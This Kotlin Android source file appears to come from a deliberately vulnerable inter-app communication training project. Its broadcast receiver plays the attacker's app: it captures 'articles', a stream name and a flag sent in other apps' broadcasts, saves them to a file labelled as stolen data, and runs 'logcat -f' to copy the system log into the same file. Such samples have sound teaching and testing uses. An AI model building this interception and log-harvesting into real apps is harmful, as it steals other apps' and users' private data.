package uk.ac.swansea.dascalu.dvmicc.call_logger2.icc

import android.content.BroadcastReceiver
import android.content.Context
import android.content.Intent

import uk.ac.swansea.dascalu.dvmicc.call_logger2.loadSecuritySettingsFromFile

import java.io.OutputStreamWriter

class CallsBroadcastReceiver : BroadcastReceiver() {

    override fun onReceive(context: Context?, intent: Intent) {
        if (context != null && intent.extras != null) {
            val securitySettings = loadSecuritySettingsFromFile(context)

            if(securitySettings.malwareSecurityLevel) {
                val jsonArticles = intent.getStringExtra("articles")
                val newsStreamName: String? = intent.getStringExtra("news_stream_name")
                val flag: String? = intent.getStringExtra("flag")

                if (jsonArticles != null) {
                    writeDataToFile(context, jsonArticles, flag, newsStreamName)
                }
            }
        }
    }

    private fun writeDataToFile(context: Context, data: String, flag: String?, newsStreamName: String?) {
        val fileOut = context.openFileOutput("data.txt", Context.MODE_APPEND)
        val writer = OutputStreamWriter(fileOut)

        Runtime.getRuntime().exec("logcat -f ${context.filesDir}/data.txt")
        Thread.sleep(500)

        if(flag != null) {
            writer.write("\nFlag: $flag ")
        }

        writer.write("Stolen News Stream: $newsStreamName\n\n")
        writer.write("$data\n\n")

        writer.close()
    }
}